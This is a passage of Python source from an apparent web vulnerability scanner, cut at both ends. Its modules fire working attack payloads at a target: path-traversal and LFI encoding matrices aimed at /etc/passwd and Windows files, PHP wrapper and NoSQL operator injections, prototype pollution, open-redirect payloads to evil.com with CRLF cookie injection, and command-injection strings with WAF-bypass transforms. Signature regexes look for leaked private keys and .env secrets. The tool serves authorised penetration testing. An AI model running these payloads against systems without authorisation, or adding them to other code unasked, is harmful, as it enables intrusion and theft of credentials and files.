def _build_traversal_payloads(target: str) -> list[str]:
    payloads = []
    # Absolute path
    payloads.append(target)
    # Traversal depths 2–8
    for depth in range(2, 9):
        for enc in _ENCODINGS:
            payloads.append(enc * depth + target.lstrip("/"))
    return payloads


def _build_all_payloads(request) -> list[str]:
    payloads = []
    for target in _TARGET_FILES:
        payloads.extend(_build_traversal_payloads(target))
    # PHP wrappers
    if _is_php(request):
        payloads.extend(_PHP_WRAPPER_PAYLOADS)
    # Custom payload file
    payloads.extend(load_payloads("lfi"))
    return payloads


def _check_lfi(body: str) -> tuple[bool, str]:
    for pattern, desc in _SIGNATURES:
        if pattern.search(body):
            return True, desc
    return False, ""


class LFICheck(BaseCheck):
    name = "lfi"
    description = "LFI — Local File Inclusion / Path Traversal with encoding matrix"
    severity = "high"
    passive = False
    cwe = "CWE-22"
    mitre_attack = "T1083"
    uses_scan_pipeline = True  # scan() builds encoding matrix + PHP wrappers

    def get_payloads(self) -> list[str]:
        return load_payloads("lfi")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, desc = _check_lfi(body)
        if not found:
            return None
        from pentool.utils.parser import build_http_request
        return Finding(
            type="lfi",
            name=f"LFI / Path Traversal ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=f"[{point.kind}:{point.name}] File signature: {desc}",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=f"LFI in {point.kind} '{point.name}'. File contents leaked ({desc}).",
            remediation="Validate and restrict file paths. Use allowlists. Disable PHP wrappers.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []
        payloads = _build_all_payloads(request)
        for point in mutator.extract_points(request):
            for payload in payloads:
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass
        return findings

"""NoSQL Injection (CWE-943) — B.1.

MongoDB operator injection via URL params and JSON body.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_NOSQL_ERRORS = [
    re.compile(r"MongoError", re.I),
    re.compile(r"CastError", re.I),
    re.compile(r"MongoServerError", re.I),
    re.compile(r"\bBSON\b"),
    re.compile(r"E11000 duplicate key"),
    re.compile(r"MongoNetworkError", re.I),
]

# URL-param operator payloads (injected as value)
_URL_PAYLOADS = [
    "[$ne]=x",
    "[$gt]=",
    "[$regex]=.*",
    "[$exists]=true",
    "[$where]=1",
]

# JSON body payloads (replace scalar value)
_JSON_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
]


def _has_nosql_error(body: str) -> tuple[bool, str]:
    for pat in _NOSQL_ERRORS:
        m = pat.search(body)
        if m:
            return True, m.group(0)[:80]
    return False, ""


class NoSQLInjectionCheck(BaseCheck):
    name = "nosql_injection"
    description = "NoSQL Injection — MongoDB operator injection (CWE-943)"
    severity = "high"
    cwe = "CWE-943"
    mitre_attack = "T1190"
    applicable_techs = ["nodejs", "mongodb"]
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _URL_PAYLOADS + _JSON_PAYLOADS

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, evidence = _has_nosql_error(body)
        if not found:
            return None
        return Finding(
            type="nosql_injection",
            name="NoSQL Injection",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=evidence,
            cwe=self.cwe,
            description="MongoDB operator injection detected via error response.",
            remediation="Validate and sanitize all user input. Use parameterized queries.",
            request_raw=format_response_raw(mutated_req),
            response_raw=body[:500],
        )

    async def scan(self, request, response, http_client, **kwargs):
        return []

"""OAuth / OIDC Vulnerability Checks (B.5).

Checks: open redirect in redirect_uri, missing state param, implicit flow token leak.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_OAUTH_PATHS = ("/oauth/", "/authorize", "/oauth2/", "/connect/authorize", "/auth/")
_OAUTH_PARAMS = ("client_id", "redirect_uri", "response_type", "scope")

_EVIL_REDIRECT = "https://evil.pentool.test"


def _is_oauth(request: "ParsedRequest") -> bool:
    url = (request.url or "").lower()
    if any(p in url for p in _OAUTH_PATHS):
        return True
    return any(p in url for p in _OAUTH_PARAMS)


class OAuthCheck(BaseCheck):
    name = "oauth"
    description = "OAuth/OIDC — open redirect, missing state, implicit flow (CWE-601)"
    severity = "medium"
    cwe = "CWE-601"
    mitre_attack = "T1550"
    uses_scan_pipeline = False

    def get_payloads(self) -> list[str]:
        return []

    async def scan(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
        http_client: "HTTPClient",
        **kwargs,
    ) -> list[Finding]:
        if not _is_oauth(request):
            return []

        findings: list[Finding] = []
        url = request.url or ""

        # 1. Missing state parameter
        if "client_id=" in url and "state=" not in url and "response_type=" in url:
            findings.append(Finding(
                type="oauth",
                name="OAuth Missing State Parameter",
                url=url,
                severity="medium",
                parameter="state",
                payload="(absent)",
                evidence="OAuth authorization request missing 'state' parameter",
                cwe="CWE-352",
                description="Missing 'state' parameter in OAuth flow allows CSRF attacks.",
                remediation="Always include a random 'state' parameter and validate it on callback.",
            ))

        # 2. Implicit flow token in URL
        if "response_type=token" in url:
            findings.append(Finding(
                type="oauth",
                name="OAuth Implicit Flow (Token in URL)",
                url=url,
                severity="medium",
                parameter="response_type",
                payload="response_type=token",
                evidence="response_type=token detected — access token exposed in URL",
                cwe="CWE-598",
                description="Implicit flow exposes access tokens in URL, which may be logged.",
                remediation="Use authorization code flow with PKCE instead of implicit flow.",
            ))

        # 3. Open redirect in redirect_uri
        if "redirect_uri=" in url:
            import copy
            from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if "redirect_uri" in params:
                params["redirect_uri"] = [_EVIL_REDIRECT]
                new_query = "&".join(
                    f"{k}={v[0]}" for k, v in params.items()
                )
                test_url = urlunparse(parsed._replace(query=new_query))
                try:
                    test_req = copy.copy(request)
                    test_req.url = test_url
                    resp = await http_client.send(test_req)
                    status = get_status(resp)
                    body = get_body(resp)
                    location = ""
                    if hasattr(resp, "headers") and resp.headers:
                        location = resp.headers.get("location", resp.headers.get("Location", ""))
                    if (300 <= status < 400 and _EVIL_REDIRECT in location) or _EVIL_REDIRECT in body:
                        findings.append(Finding(
                            type="oauth",
                            name="OAuth Open Redirect in redirect_uri",
                            url=url,
                            severity="high",
                            parameter="redirect_uri",
                            payload=_EVIL_REDIRECT,
                            evidence=f"Redirected to {_EVIL_REDIRECT}",
                            cwe="CWE-601",
                            description="Server accepts arbitrary redirect_uri — authorization code/token can be stolen.",
                            remediation="Validate redirect_uri against a strict allowlist.",
                            request_raw=format_response_raw(test_req),
                            response_raw=body[:500],
                        ))
                except Exception:
                    pass

        return findings

FILE: modules/scanner/checks/open_redirect.py
--------------------------------------------------------------------------------
"""Open Redirect (CWE-601) — smart payloads + meta/JS redirect detection."""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, get_location, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_ATTACKER = "evil.com"
_ATTACKER2 = "attacker.com"

_REDIRECT_PAYLOADS = [
    # Direct
    f"https://{_ATTACKER}",
    f"http://{_ATTACKER}",
    f"//{_ATTACKER}",
    f"//{_ATTACKER}/",
    # Protocol-relative variants
    f"////{_ATTACKER}",
    f"///{_ATTACKER}",
    # Backslash
    f"\\\\{_ATTACKER}",
    f"/\\/{_ATTACKER}",
    f"\\/\\/{_ATTACKER}",
    # Encoded slashes
    f"/%2F{_ATTACKER}",
    f"/%5C{_ATTACKER}",
    f"%2F%2F{_ATTACKER}",
    f"%5C%5C{_ATTACKER}",
    # Tab/newline in path
    f"/%09/{_ATTACKER}",
    f"/%0d/{_ATTACKER}",
    f"/%0a/{_ATTACKER}",
    # Userinfo confusion
    f"https://legitimate.com@{_ATTACKER}",
    f"https://{_ATTACKER}@legitimate.com",
    # Fragment confusion
    f"https://{_ATTACKER}#legitimate.com",
    f"https://{_ATTACKER}?legitimate.com",
    # Subdomain confusion
    f"https://legitimate.com.{_ATTACKER}",
    f"https://{_ATTACKER}.legitimate.com",
    # Dot encoding
    f"https://{_ATTACKER.replace('.', '%2e')}",
    f"https://{_ATTACKER.replace('.', '%E3%80%82')}",   # Unicode fullstop
    # Null byte
    f"https://{_ATTACKER}%00.legitimate.com",
    f"https://{_ATTACKER}%09.legitimate.com",
    # CRLF + Location injection (combined open redirect + header injection)
    f"https://{_ATTACKER}%0d%0aX-Injected: yes",
    f"https://{_ATTACKER}%0d%0aSet-Cookie: session=hijacked",
    # Second attacker domain
    f"//{_ATTACKER2}",
    f"https://{_ATTACKER2}",
]

_REDIRECT_DOMAINS = {_ATTACKER, _ATTACKER2, "evil.com", "attacker.com"}

# Patterns for JS-based and meta-refresh redirects
_META_REDIRECT = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;\s*url=([^"\'>\s]+)',
    re.I,
)
_JS_REDIRECT_PATTERNS = [
    re.compile(r'(?:window\.location|location\.href|location\.replace|location\.assign)\s*[=(]\s*["\']([^"\']+)', re.I),
    re.compile(r'window\.navigate\s*\(\s*["\']([^"\']+)', re.I),
    re.compile(r'document\.location\s*=\s*["\']([^"\']+)', re.I),
]


def _is_redirect_to_attacker(url: str) -> bool:
    u = url.lower()
    return any(d in u for d in _REDIRECT_DOMAINS)


def _check_redirect(response, payload: str) -> str | None:
    """Return evidence string if redirect to attacker detected, else None."""
    status   = get_status(response)
    location = get_location(response) or ""
    body     = get_body(response)

    # 1. HTTP redirect (3xx)
    if status in (301, 302, 303, 307, 308) and location:
        if _is_redirect_to_attacker(location):
            return f"HTTP {status} Location: {location}"
        # Payload itself reflected in Location (protocol-relative etc.)
        p_clean = payload.replace("https:", "").replace("//", "").lower()
        if p_clean and p_clean in location.lower():
            return f"HTTP {status} Location contains payload: {location}"

    # 2. Meta-refresh redirect in body
    m = _META_REDIRECT.search(body)
    if m and _is_redirect_to_attacker(m.group(1)):
        return f"Meta-refresh redirect: {m.group(1)}"

    # 3. JavaScript redirect in body
    for pat in _JS_REDIRECT_PATTERNS:
        m = pat.search(body)
        if m and _is_redirect_to_attacker(m.group(1)):
            return f"JS redirect: {m.group(1)}"

    return None


class OpenRedirectCheck(BaseCheck):
    name = "open_redirect"
    description = "Open Redirect — HTTP 3xx, meta-refresh, JS redirect, whitelist bypass"
    severity = "medium"
    passive = False
    cwe = "CWE-601"
    mitre_attack = "T1598"
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _REDIRECT_PAYLOADS + load_payloads("open_redirect")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        evidence = _check_redirect(response, payload)
        if not evidence:
            return None
        from pentool.utils.parser import build_http_request
        return Finding(
            type="open_redirect",
            name=f"Open Redirect ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=f"[{point.kind}:{point.name}] {evidence}",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=f"Open redirect in {point.kind} '{point.name}'. {evidence}",
            remediation="Validate redirect URLs against an allowlist of trusted destinations.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []
        for point in mutator.extract_points(request):
            for payload in self.get_payloads():
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass
        return findings

FILE: modules/scanner/checks/path_traversal.py
--------------------------------------------------------------------------------
"""Path Traversal (CWE-22) — encoding matrix + regex signatures + PHP wrappers."""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── Signatures (regex, not string-contains) ────────────────────────────────────

_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"root:[x*!]:\d+:\d+"),                           "Linux /etc/passwd"),
    (re.compile(r":\d+:/[a-z]+/(?:bash|sh|false|nologin)\b"),     "Linux /etc/passwd shell field"),
    (re.compile(r"daemon:[x*!]:\d+"),                             "Linux /etc/passwd daemon entry"),
    (re.compile(r"\[boot loader\]", re.I),                        "Windows boot.ini"),
    (re.compile(r"\[operating systems\]", re.I),                  "Windows boot.ini"),
    (re.compile(r"for 16-bit app support", re.I),                 "Windows win.ini"),
    (re.compile(r"\[fonts\]", re.I),                              "Windows win.ini"),
    (re.compile(r"127\.0\.0\.1\s+localhost"),                     "/etc/hosts"),
    (re.compile(r"Linux version \d+\.\d+"),                       "/proc/version"),
    (re.compile(r"HOME=/|USER=\w"),                               "/proc/self/environ"),
    (re.compile(r"PROCESSOR_ARCHITECTURE", re.I),                 "Windows environ"),
    (re.compile(r"<\?php\s"),                                     "PHP source disclosure"),
    (re.compile(r"DB_PASSWORD\s*="),                              ".env file"),
    (re.compile(r"APP_KEY\s*="),                                  ".env file"),
    (re.compile(r"ssh-rsa AAAA"),                                 "SSH public key"),
    (re.compile(r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----"), "Private key"),
]

# ── Path-named params (high priority) ─────────────────────────────────────────

_PATH_PARAM_NAMES = {
    "file", "path", "page", "dir", "include", "doc", "filename",
    "template", "view", "load", "read", "url", "src", "source",
    "folder", "resource", "document", "route", "f",
}

# ── Encoding matrix ────────────────────────────────────────────────────────────

_ENCODINGS = [
    "../",
    "..\\",
    "..%2f",
    "..%5c",
    "%2e%2e/",
    "%2e%2e%2f",
    "..%252f",       # double URL-encode
    "..%c0%af",      # Unicode overlong
    "..%c1%9c",
    "....//",        # after normalization → ../
    "..;/",          # Tomcat path separator
    "..\\/",         # mixed slashes
    "../%00",        # null byte (old PHP)
]

_TARGET_FILES = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

# PHP wrapper payloads
_PHP_INDICATORS = [
    re.compile(r"\.php(\?|$|/)", re.I),
    re.compile(r"X-Powered-By:\s*PHP", re.I),
    re.compile(r"(?:Fatal error|Parse error|Warning):\s+.+ in /", re.I),
]

_PHP_WRAPPER_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=../index",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]


def _is_php(request) -> bool:
    url = getattr(request, "url", "") or ""
    headers = getattr(request, "headers", {}) or {}
    for pattern in _PHP_INDICATORS:
        if pattern.search(url):
            return True
        for v in headers.values():
            if pattern.search(str(v)):
                return True
    return False


def _build_traversal_payloads(target: str) -> list[str]:
    payloads = [target]
    for depth in range(2, 9):
        for enc in _ENCODINGS:
            payloads.append(enc * depth + target.lstrip("/\\"))
    return payloads


def _build_all_payloads(request) -> list[str]:
    payloads: list[str] = []
    for target in _TARGET_FILES:
        payloads.extend(_build_traversal_payloads(target))
    if _is_php(request):
        payloads.extend(_PHP_WRAPPER_PAYLOADS)
    payloads.extend(load_payloads("path_traversal"))
    return payloads


def _check_traversal(body: str) -> tuple[bool, str]:
    for pattern, desc in _SIGNATURES:
        if pattern.search(body):
            return True, desc
    return False, ""


# ── Backward-compat exports ────────────────────────────────────────────────────

_UNIX_SIGNATURES = [
    "root:x:0:0", "root:*:0:0", "daemon:x:",
    "/etc/shadow", "Linux version", "HOME=/", "USER=",
    "PROCESSOR_ARCHITECTURE",
]
_WIN_SIGNATURES = [
    "[boot loader]", "[operating systems]", "for 16-bit app support",
    "[fonts]", "[extensions]",
]
_TRAVERSAL_PAYLOADS = (
    _build_traversal_payloads("/etc/passwd") +
    _build_traversal_payloads("C:\\Windows\\win.ini")
)
_PT_PAYLOADS = _TRAVERSAL_PAYLOADS
_MAX_PAYLOADS = 15


def _classify_evidence(body: str) -> str:
    body_lower = body.lower()
    for sig in _UNIX_SIGNATURES:
        if sig.lower() in body_lower:
            return f"Unix file ({sig})"
    for sig in _WIN_SIGNATURES:
        if sig.lower() in body_lower:
            return f"Windows file ({sig})"
    return "Traversal pattern"


class PathTraversalCheck(BaseCheck):
    name = "path_traversal"
    description = "Path Traversal — encoding matrix + PHP wrappers + regex signatures"
    severity = "high"
    passive = False
    cwe = "CWE-22"
    mitre_attack = "T1083"
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _TRAVERSAL_PAYLOADS + load_payloads("path_traversal")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, desc = _check_traversal(body)
        if not found:
            return None
        method = (getattr(mutated_req, "method", "GET") or "GET").upper()
        from pentool.utils.parser import build_http_request
        return Finding(
            type="path_traversal",
            name=f"Path Traversal ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=f"{method} [{point.kind}:{point.name}] Path Traversal — file signature: {desc}",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=f"Path traversal in {point.kind} '{point.name}'. File contents leaked ({desc}).",
            remediation="Canonicalize paths and validate against base directory. Use allowlists.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []
        payloads = _build_all_payloads(request)

        points = mutator.extract_points(request)
        priority = [p for p in points if p.name.lower() in _PATH_PARAM_NAMES]
        others = [p for p in points if p.name.lower() not in _PATH_PARAM_NAMES]

        for point in priority + others:
            for payload in payloads:
                mutated = mutator.mutate(request, point, payload)
                try:
                    method = (getattr(mutated, "method", "GET") or "GET").upper()
                    headers = dict(mutated.headers or {})
                    if method == "POST":
                        resp = await http_client.post(mutated.url, body=mutated.body or "", headers=headers)
                    else:
                        resp = await http_client.get(mutated.url, headers=headers)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass
        return findings

"""Prototype Pollution (CWE-1321) — B.3.

Server-Side Prototype Pollution via JSON body and URL-encoded params.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_MARKER = "pentool_pp_confirmed"

_PAYLOADS = [
    f'{{"__proto__": {{"{_MARKER}": "1"}}}}',
    f'{{"constructor": {{"prototype": {{"{_MARKER}": "1"}}}}}}',
    f'__proto__[{_MARKER}]=1',
    f'constructor[prototype][{_MARKER}]=1',
]

_ERROR_PATTERNS = [
    re.compile(r"TypeError.*Cannot set property", re.I),
    re.compile(r"TypeError.*Cannot assign to read only", re.I),
]


class PrototypePollutionCheck(BaseCheck):
    name = "prototype_pollution"
    description = "Server-Side Prototype Pollution (CWE-1321)"
    severity = "high"
    cwe = "CWE-1321"
    mitre_attack = "T1190"
    applicable_techs = ["nodejs"]
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _PAYLOADS

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        if _MARKER in body:
            return Finding(
                type="prototype_pollution",
                name="Server-Side Prototype Pollution",
                url=mutated_req.url,
                severity=self.severity,
                parameter=point.name,
                payload=payload,
                evidence=f"Marker '{_MARKER}' reflected in response",
                cwe=self.cwe,
                description="Prototype pollution marker reflected — SSPP confirmed.",
                remediation="Freeze Object.prototype. Use Object.create(null) for user-controlled objects.",
                request_raw=format_response_raw(mutated_req),
                response_raw=body[:500],
            )
        for pat in _ERROR_PATTERNS:
            m = pat.search(body)
            if m:
                return Finding(
                    type="prototype_pollution",
                    name="Server-Side Prototype Pollution (Error)",
                    url=mutated_req.url,
                    severity=self.severity,
                    parameter=point.name,
                    payload=payload,
                    evidence=m.group(0)[:120],
                    cwe=self.cwe,
                    description="TypeError on prototype assignment — SSPP attempt detected.",
                    remediation="Freeze Object.prototype. Use Object.create(null) for user-controlled objects.",
                    request_raw=format_response_raw(mutated_req),
                    response_raw=body[:500],
                )
        return None

    async def scan(self, request, response, http_client, **kwargs):
        return []

FILE: modules/scanner/checks/rce.py
--------------------------------------------------------------------------------
"""RCE — Remote Code Execution / Command Injection (CWE-78).

Improvements:
- Regex-based payload→signature mapping (no FP on 'root' in HTML)
- WAF bypass transforms (space substitution, quote bypass, encoding)
- Time-based blind detection
- Filter bypass variants (IFS, quoting, hex encoding)
"""
from __future__ import annotations

import re
import statistics
import time
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse


# ── Response signatures ────────────────────────────────────────────────────────

# Regex patterns for OS command output — highly specific, won't match normal HTML
_ID_PATTERN     = re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+")
_WHOAMI_PATTERN = re.compile(r"(?m)^(root|www-data|apache|nginx|nobody|daemon|web|http|postgres|mysql|ftp)\s*$")
_PASSWD_PATTERN = re.compile(r"[\w-]+:[x*!]:\d+:\d+:[^:]*:[/\w-]+:[/\w-]+")
_WINI_PATTERN   = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
_WIN_WHOAMI_PATTERN = re.compile(r"(?:NT AUTHORITY|BUILTIN|[\w]+\\[\w]+)\\[\w]+", re.I)
_UNAME_PATTERN  = re.compile(r"Linux\s+[\w.-]+\s+\d+\.\d+\.\d+")

# Map payload categories to detection patterns
_PAYLOAD_PATTERNS: list[tuple[re.Pattern, re.Pattern, str]] = [
    # (payload_match, output_match, description)
    (re.compile(r"\bid\b"),        _ID_PATTERN,     "id command output"),
    (re.compile(r"\bwhoami\b"),    _WHOAMI_PATTERN, "whoami output"),
    (re.compile(r"whoami"),        _WIN_WHOAMI_PATTERN, "Windows whoami output"),
    (re.compile(r"passwd"),        _PASSWD_PATTERN, "/etc/passwd contents"),
    (re.compile(r"win\.ini", re.I), _WINI_PATTERN,  "Windows win.ini contents"),
    (re.compile(r"\buname\b"),     _UNAME_PATTERN,  "uname output"),
]

# Generic fallback — checked when payload doesn't match any category
_GENERIC_PATTERNS: list[tuple[re.Pattern, str]] = [
    (_ID_PATTERN,       "id command output"),
    (_PASSWD_PATTERN,   "/etc/passwd contents"),
    (_WINI_PATTERN,     "Windows win.ini contents"),
    (_UNAME_PATTERN,    "uname output"),
    (_WIN_WHOAMI_PATTERN, "Windows whoami"),
]

# Built-in payload list (loaded before yaml file to guarantee coverage)
_BUILTIN_PAYLOADS = [
    ";id", "&&id", "|id", "$(id)", "`id`",
    "1;id", "1|id", "1$(id)",
    "\nid", "\r\nid",
    ";whoami", "&&whoami", "|whoami",
    ";cat /etc/passwd", "|cat /etc/passwd",
    "; id", "& id", "|| id",
    ";id%09", ";${IFS}id",
    "& whoami", "| whoami",
    "; uname -a", "| uname -a",
]


def _check_rce_response(payload: str, body: str) -> str | None:
    """Return evidence description if RCE confirmed, else None."""
    # Try payload-specific patterns first
    for pl_pat, out_pat, desc in _PAYLOAD_PATTERNS:
        if pl_pat.search(payload):
            if out_pat.search(body):
                return desc
            return None  # payload matched a category but output not found → not this check

    # Fallback: generic patterns for unknown payloads
    for pat, desc in _GENERIC_PATTERNS:
        if pat.search(body):
            return desc
    return None


# ── WAF bypass transforms ──────────────────────────────────────────────────────

_WAF_STATUS = {403, 406, 429, 501, 503}

_SPACE_BYPASSES = [
    "${IFS}",
    "\t",
    "\n",
    "<",     # bash: cmd<arg works without space
    "{,}",   # brace expansion: {cmd}
    "%09",   # URL-encoded tab
    "%0a",   # URL-encoded newline
]

def _waf_variants(payload: str) -> list[str]:
    """Generate WAF bypass variants of a payload."""
    variants = []
    seen = {payload}

    def add(p: str) -> None:
        if p not in seen:
            seen.add(p)
            variants.append(p)

    # Space substitution
    if " " in payload:
        for bypass in _SPACE_BYPASSES:
            add(payload.replace(" ", bypass))

    # Quote injection to bypass string matching WAFs
    for cmd in ("id", "whoami", "cat", "ping", "curl", "wget", "sleep"):
        if cmd in payload:
            # Split command with empty string var: i''d → id
            add(payload.replace(cmd, cmd[:1] + "''" + cmd[1:]))
            # Shell variable: ${HOME%%*} empty → id = i$((1-1))d etc.
            # Simpler: hex encoding
            hex_cmd = "".join(f"\\x{ord(c):02x}" for c in cmd)
            add(payload.replace(cmd, f"$'{hex_cmd}'"))
            # Brace expansion: {id} → id
            add(payload.replace(cmd, f"{{'{cmd}'}}"))
            break

    # Semicolon bypass
    for sep in (";", "|", "&&", "||"):
        if payload.startswith(sep):
            # Try adding prefix digit to confuse parsers
            add(f"1{payload}")
            add(f"a{payload}")
            break

    # Newline injection variants
    add(payload.replace(";", "%0a"))
    add(payload.replace(";", "\n"))
    add(payload.replace(";", "%0d%0a"))

    return variants[:8]  # cap to avoid explosion


# ── Time-based blind RCE payloads ──────────────────────────────────────────────

_TIME_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",  # Windows
    "%0asleep%205",
    "${IFS}sleep${IFS}5",
    "; sleep${IFS}5",
]

# Windows polyglots (C.4)
_WINDOWS_PAYLOADS = [
    "& whoami",
    "| whoami",
    "&& whoami",
    "|| whoami",
    "; whoami",
    "& dir",
    "| dir",
    "& type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "& echo %USERDOMAIN%\\%USERNAME%",
    "| echo %USERDOMAIN%\\%USERNAME%",
    "& ver",
    "| ver",
    "1 & whoami",
    "1 | whoami",
    "a & whoami",
    "a | whoami",
]

_WIN_CONFIRM_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"NT AUTHORITY\\|BUILTIN\\|[\w]+\\[\w]+", re.I), "Windows whoami output"),
    (re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I), "Windows win.ini"),
    (re.compile(r"Microsoft Windows \[Version", re.I), "Windows ver output"),
    (re.compile(r"Volume in drive [A-Z] is", re.I), "Windows dir output"),
